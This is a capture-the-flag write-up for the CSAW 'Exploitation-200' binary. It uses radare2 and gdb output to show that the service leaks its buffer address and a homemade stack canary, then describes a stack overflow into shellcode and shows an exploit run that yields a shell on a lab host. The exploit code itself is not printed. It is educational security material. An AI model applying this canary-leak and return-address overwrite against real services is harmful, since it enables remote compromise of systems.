## Exploitation-200 Writeup
First we realize that it is a binary that establishes a listening socket by a port we see using <code>iz</code> command with radare2.
<pre><code>[0xb7f1da20]> iz
000 0x00000cf0 0x08048cf0  98  99 (.rodata) ascii Welcome to CSAW CTF.  Exploitation 2 will be a little harder this year.  Insert your exploit here:
001 0x00000d53 0x08048d53   5   6 (.rodata) ascii 31338
002 0x00000d59 0x08048d59   7   8 (.rodata) ascii 0.0.0.0
</code></pre>
Or we can see in <code>main</code> function.
<pre><code>0x0804897a      ba538d0408     mov edx, str.31338          ; 0x8048d53 ; "31338"
0x0804897f      b8598d0408     mov eax, str.0.0.0.0        ; 0x8048d59 ; "0.0.0.0"
</code></pre>
Then we need to establish a connection using netcat to the server that is the vulnerable binary, and also use gdb to attach the process that is running in addition to setting fork mode child and thus stop at our breakpoint and debugging the <code>handle</code> function. Next we start doing reverse engineering in the <code>handle</code> function so we place a breakpoint in canary self-implementation <code>0x08048850</code> and also after each call to the <code>send</code> function.
<pre><code>gef➤  !netstat -antp
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.1.1:53            0.0.0.0:*               LISTEN      1000/dnsmasq    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      967/sshd        
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      9704/cupsd      
tcp        0      0 0.0.0.0:31338           0.0.0.0:*               LISTEN      11259/exploit2
</code></pre>
We attach the process.
<pre><code>gef➤  attach 11259
gef➤  set follow-fork-mode child
gef➤  b *0x08048850
Breakpoint 2 at 0x8048850: file exploit2.c, line 31.
gef➤  c
Continuing.
</code></pre>
We use netcat to make the connection and just stop at breakpoint. <code>naivenom@ubuntu:~/Desktop/baby/explotation-200$ nc 0.0.0.0 31338</code>. We advance one step and we see that the return value of the <code>rand</code> function returns a value that is stored in the <code>eax</code> register that is then moved to secret, being our canary and also in <code>ebp-0xc</code> to be able to compare with the secret value and thus check if there has been any buffer overflow when writing on the stack.
<pre><code> 0x804884b <handle+62>         call   0x8048680 <rand@plt>
    0x8048850 <handle+67>      mov    ds:0x804a074, eax
 →  0x8048855 <handle+72>      mov    eax, ds:0x804a074
    0x804885a <handle+77>      mov    DWORD PTR [ebp-0xc], eax
</code></pre>
We see using the following command.
<pre><code>gef➤  x/xw 0x804a074
0x804a074 <secret>:	0x508d386e
</code></pre>
So we know that the canary is in <code>epb-0xc</code>. After the first call of <code>send</code> function the netcat connection receives 4 bytes of data corresponding to a stack memory address <code>0xbfc5d3cc</code>. In the next call of <code>send</code> function sends the server to our netcat client the value of our canary.
<pre><code>0xbfc5d3b0│+0x00: 0x00000004	 ← $esp
0xbfc5d3b4│+0x04: 0xbfc5dbcc  →  0x508d386e
</code></pre>
Therefore this is a vulnerability since we have control of the value of the canary and the memory address of the stack that we do not know yet that it can allow us to do. After the third <code>send</code> function sends us the welcome string.
<pre><code>naivenom@ubuntu:~/Desktop/baby/explotation-200$ nc 0.0.0.0 31338
��ſn8�PWelcome to CSAW CTF.  Exploitation 2 will be a little harder this year.  Insert your exploit here:
</code></pre>
Before calling the <code>recv</code> function the memory address of stack that the server sent to the netcat client is passed as argument.
<pre><code>recv@plt (
   [sp + 0x0] = 0xbfc5d3cc → 0xbfc5d3cc → [loop detected],
   [sp + 0x4] = 0x00001000,
   [sp + 0x8] = 0x00000000
)
</code></pre>
Ahh cool, so we can send with netcat some data and the server use the <code>recv</code> function to receive and we have writing control knowing the memory address to know the start of our buffer.
<pre><code>0xbfc5d3b0│+0x00: 0x00000004	 ← $esp
0xbfc5d3b4│+0x04: 0xbfc5d3cc  →  "AAAABBBBCCCCDDDD"
</code></pre>
We must evaluate the stack in order to know how to build our exploit and send the payload correctly with the shellcode.
<pre><code>
+----------------------+
|...higher addresses...|
+----------------------+
|    AAAABBBBCCCCDDDD  | <-- $ebp-0x80c or $esp+28. Start of buffer in 0xbfc5d3cc. Shellcode place
+----------------------+
|         .....        | #padding
+----------------------+
|         canary       | <-- $ebp-0xc or $esp+2076
+----------------------+
|         ebp-0x8      |
+----------------------+
|         ebp-0x4      | 
+----------------------+
|         ebp          | 
+----------------------+
|    [return addr]     | <-- return address #0x08048bd9 $esp+2092
+----------------------+
|...lower addresses....| <-- other data from previous function
+----------------------+
</code></pre>
Therefore taking into account the canary and having control of the memory address where our buffer begins we can get control <code>eip</code> by overwriting the return address pointing the beginning of the buffer and thus execute the shellcode. We run the exploit and gaining a shell!.
<pre><code>naivenom@parrot:[~/pwn/baby/explotation-200] $ python exploit.py 
[+] Opening connection to 192.168.80.132 on port 31338: Done
[*] Buffer: 0xbfc5d3cc
[*] Canary: 0x2ebfde58
[+] Opening connection to 192.168.80.132 on port 11111: Done
[*] Switching to interactive mode
$ id
uid=1000(naivenom) gid=1000(naivenom) groups=1000(naivenom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ uname -a
Linux ubuntu 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:26:51 UTC 2018 i686 i686 i686 GNU/Linux
</code></pre>
